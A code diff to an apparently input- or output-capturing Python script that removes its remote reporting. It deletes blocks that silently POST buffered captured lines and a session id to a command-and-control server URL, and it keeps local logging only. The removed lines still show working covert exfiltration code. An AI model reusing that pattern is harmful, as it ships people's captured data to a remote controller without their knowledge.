@@ -53,21 +53,14 @@ while True:
 
         current_line = ""
         
-        # Push every 2 seconds or 50 lines
+        # Flush buffer locally without network POST
         if len(buffer) >= 50 or (time.time() - last_push) > 2.0:
-            if buffer:
-                try:
-                    requests.post(f"{C2_SERVER_URL}/api/logs", 
-                                  json={"lines": buffer, "session": C2_SESSION}, 
-                                  timeout=2)
-                except Exception:
-                    pass
-                buffer = []
+            buffer = []
             last_push = time.time()
     else:
         current_line += char
 
-# Push remaining
+# Clear remaining buffer without network POST
 if buffer or current_line:
     if current_line:
         buffer.append(current_line.strip())
@@ -77,12 +70,6 @@ if buffer or current_line:
                 log_fp.flush()
             except Exception:
                 pass
-    try:
-        requests.post(f"{C2_SERVER_URL}/api/logs", 
-                      json={"lines": buffer, "session": C2_SESSION}, 
-                      timeout=2)
-    except Exception:
-        pass
 
 if log_fp:
     try:
